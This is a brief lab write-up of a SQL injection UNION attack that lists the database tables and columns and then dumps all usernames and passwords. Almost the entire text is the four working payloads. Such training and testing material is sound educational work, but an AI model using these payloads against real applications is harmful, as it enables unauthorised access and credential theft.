# Lab
1) Determine number of columns and confirm they can hold string data
`' UNION SELECT 'abc','def'--`<br>
2) Use the following payload to retrieve the list of tables in the database:
```bash
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
after using it I find table named: `users_mxcjah`<br>
3) Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
```bash
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_mxcjah'--
```
After using that payload I found 2 columns for users and passwords: `username_tpngqp` and `password_gtvpsz`<br>
4) Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
```bash
' UNION SELECT username_tpngqp, password_gtvpsz FROM users_mxcjah--
```

